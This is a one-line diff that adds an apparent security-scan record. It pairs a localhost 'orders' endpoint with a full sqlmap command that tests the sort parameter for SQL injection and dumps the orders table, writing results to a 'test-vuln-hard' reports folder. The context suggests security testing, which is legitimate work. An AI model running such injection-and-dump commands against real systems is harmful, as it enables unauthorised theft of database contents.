@@ -1,0 +1,1 @@
+http://127.0.0.1:8098/orders?sort=1 (GET)  # /usr/bin/sqlmap -u http://127.0.0.1:8098/orders?sort=1 --batch --technique=BEU -T orders --dump --timeout=15 --output-dir=/opt/ares/security_reports/test-vuln-hard_20261107T210232Z/sqlmap
